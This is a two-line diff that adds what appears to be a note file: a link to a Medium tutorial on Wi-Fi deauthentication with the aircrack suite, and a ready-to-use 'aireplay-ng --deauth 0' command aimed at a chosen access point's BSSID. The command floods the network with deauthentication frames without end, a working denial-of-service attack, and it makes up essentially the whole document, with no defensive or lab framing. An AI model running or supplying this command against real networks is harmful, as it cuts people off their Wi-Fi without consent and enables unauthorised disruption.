@@ -1,0 +1,2 @@
+https://medium.datadriveninvestor.com/deauthentication-using-the-aircrack-suite-in-kalilinux-cdd13568c2a1
+sudo aireplay-ng --deauth 0 -a [bssid] wlp3s0
